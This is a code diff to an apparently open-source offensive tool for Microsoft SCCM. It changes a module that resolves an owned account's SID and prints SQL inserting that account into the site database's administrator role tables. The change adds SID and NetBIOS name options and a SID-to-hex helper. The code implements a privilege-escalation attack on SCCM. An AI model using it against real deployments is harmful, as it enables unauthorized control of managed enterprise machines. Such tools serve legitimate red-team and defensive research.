@@ -19,7 +19,8 @@ class MSSQL:
 
     def __init__(self, username=None, password=None, domain=None, target_dom=None,
                         dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None,
-                        aes=None, debug=False, target_user=None, stacked=False, channel_binding=False, signing=False, site_code=None, sql_sid=False):
+                        aes=None, debug=False, target_user=None, stacked=False, channel_binding=False, 
+                        signing=False, site_code=None, sql_sid=False, netbiosname=None, sid=None):
             self.username = username
             self.password = password
             self.domain = domain
@@ -28,7 +29,7 @@ class MSSQL:
             self.ldaps = ldaps
             self.kerberos = kerberos
             self.no_pass = no_pass
-            self.hashes=hashes
+            self.hashes = hashes
             self.aes = aes
             self.debug = debug
             self.target_user = target_user
@@ -37,7 +38,8 @@ class MSSQL:
             self.channel_binding = channel_binding
             self.signing = signing
             self.site_code = site_code
-            self.netbiosname = ""
+            self.netbiosname = netbiosname
+            self.sid = sid
             self.query_sid = ""
     
     def run(self):
@@ -50,8 +52,23 @@ class MSSQL:
                 return False
             self.netbiosname, self.target_user = self.target_user.split('\\', 1)
             return self.mssql_abuse()
+
+        if self.sid:
+            if not re.fullmatch(r'S-1-\d+(-\d+)+', self.sid):
+                logger.info('[-] Invalid SID. Use a canonical SID, e.g. S-1-5-21-...-1119.')
+                return False
+            try:
+                self.querysid = self.convert_sid_to_hex(self.sid)
+                logger.info(f'[*] Converted provided SID to {self.querysid}')
+            except Exception as e:
+                logger.info(f'[-] Failed to parse SID {self.sid}: {str(e)}')
+                return False
+            if self.netbiosname:
+                logger.debug(f"[+] Using provided netbiosname: {self.netbiosname}")
+                return self.mssql_abuse(self.querysid)
+
         if not self.domain or not self.dc_ip:
-            logger.info('[-] Domain (-d) and domain controller (-dc-ip) are required for LDAP SID resolution.')
+            logger.info('[-] Domain (-d) and domain controller (-dc-ip) are required for LDAP SID and/or NETBIOS resolution.')
             return False
            
         lmhash = ""
@@ -86,59 +103,61 @@ class MSSQL:
             logger.info(f'[-] Error: {str(e)}')
             return False
         
-        logger.info(f'[*] Resolving {self.target_user} SID...')
-        
+        if not self.sid:
+            logger.info(f'[*] Resolving {self.target_user} SID...')
 
-        try:
-            self.ldap_session.extend.standard.paged_search(self.search_base, 
-                                                           search_filter=f"(samaccountname={self.target_user})", 
-                                                           attributes="objectsid",
-                                                           paged_size=1, 
-                                                           generator=False)  
-        except ldap3.core.exceptions.LDAPAttributeError as e:
-            print()
-            logger.info(f'[-] Error: {str(e)}')
-            exit()
-        if self.ldap_session.entries:
-            for entry in self.ldap_session.entries:
-                json_entry = json.loads(entry.entry_to_json())
-                attributes = json_entry['attributes'].keys()
-                for attr in attributes:
-                    if attr == "objectSid":
-                        sid = format_sid(entry[attr].value)
-                        logger.debug(f"[+] Found {self.target_user} SID: {sid}")
-                        #abusing MSSQL requires the hex SID of the owned account
-                        #REF: https://thehacker.recipes/ad/movement/sccm-mecm#1.-retreive-the-controlled-user-sid
-                        hexsid = ldaptypes.LDAP_SID()
-                        hexsid.fromCanonical(sid)
-                        self.querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
-                        logger.info(f'[*] Converted {self.target_user} SID to {self.querysid}')
 
+            try:
+                self.ldap_session.extend.standard.paged_search(self.search_base,
+                                                               search_filter=f"(samaccountname={self.target_user})",
+                                                               attributes="objectsid",
+                                                               paged_size=1,
+                                                               generator=False)
+            except ldap3.core.exceptions.LDAPAttributeError as e:
+                print()
+                logger.info(f'[-] Error: {str(e)}')
+                exit()
+            if self.ldap_session.entries:
+                for entry in self.ldap_session.entries:
+                    json_entry = json.loads(entry.entry_to_json())
+                    attributes = json_entry['attributes'].keys()
+                    for attr in attributes:
+                        if attr == "objectSid":
+                            sid = format_sid(entry[attr].value)
+                            logger.debug(f"[+] Found {self.target_user} SID: {sid}")
+                            #abusing MSSQL requires the hex SID of the owned account
+                            #REF: https://thehacker.recipes/ad/movement/sccm-mecm#1.-retreive-the-controlled-user-sid
+                            self.querysid = self.convert_sid_to_hex(sid)
+                            logger.info(f'[*] Converted {self.target_user} SID to {self.querysid}')
+
+            else:
+                print("[-] Failed to resolve target SID.")
+                return False
+
+        if self.netbiosname:
+            logger.debug(f"[+] Using provided netbiosname: {self.netbiosname}")
         else:
-            print("[-] Failed to resolve target SID.")
-            return False
-        
-        try:
-            forest_search_base = ",".join(self.search_base.split(",")[-2:]) # we keep only the last part because we want to query ldap at the forest level
-            search_base = f"CN=Configuration,{forest_search_base}"
-            search_filter = f"(&(objectclass=crossRef)(ncname={self.search_base}))"
-            self.ldap_session.extend.standard.paged_search(search_base=search_base, 
-                                                           search_filter=search_filter, 
-                                                           attributes="nETBIOSName",
-                                                           paged_size=1, 
-                                                           generator=False)  
-        except ldap3.core.exceptions.LDAPAttributeError as e:
-            print()
-            logger.info(f'[-] Error: {str(e)}')
-            exit()
-        if self.ldap_session.entries:
-            for entry in self.ldap_session.entries:
-                self.netbiosname = str(entry['nETBIOSName'])
-                logger.debug(f"[+] Found domain netbiosname: {self.netbiosname}")
-        else:
-            print("[-] Failed to resolve netbiosname.")
-            return False
-        
+            try:
+                forest_search_base = ",".join(self.search_base.split(",")[-2:]) # we keep only the last part because we want to query ldap at the forest level
+                search_base = f"CN=Configuration,{forest_search_base}"
+                search_filter = f"(&(objectclass=crossRef)(ncname={self.search_base}))"
+                self.ldap_session.extend.standard.paged_search(search_base=search_base,
+                                                               search_filter=search_filter,
+                                                               attributes="nETBIOSName",
+                                                               paged_size=1,
+                                                               generator=False)
+            except ldap3.core.exceptions.LDAPAttributeError as e:
+                print()
+                logger.info(f'[-] Error: {str(e)}')
+                exit()
+            if self.ldap_session.entries:
+                for entry in self.ldap_session.entries:
+                    self.netbiosname = str(entry['nETBIOSName'])
+                    logger.debug(f"[+] Found domain netbiosname: {self.netbiosname}")
+            else:
+                print("[-] Failed to resolve netbiosname.")
+                return False
+
         self.mssql_abuse(self.querysid)
         
     def mssql_abuse(self,hex_sid=None):
@@ -186,6 +205,13 @@ INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES
 INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ({admin_id},'SMS0001R','SMS00004','1');
         '''
         print(second_queries)
+
+    
+    def convert_sid_to_hex(self, sid):
+        hexsid = ldaptypes.LDAP_SID()
+        hexsid.fromCanonical(sid)
+        querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
+        return querysid
 
 
     def get_dn(self, domain):
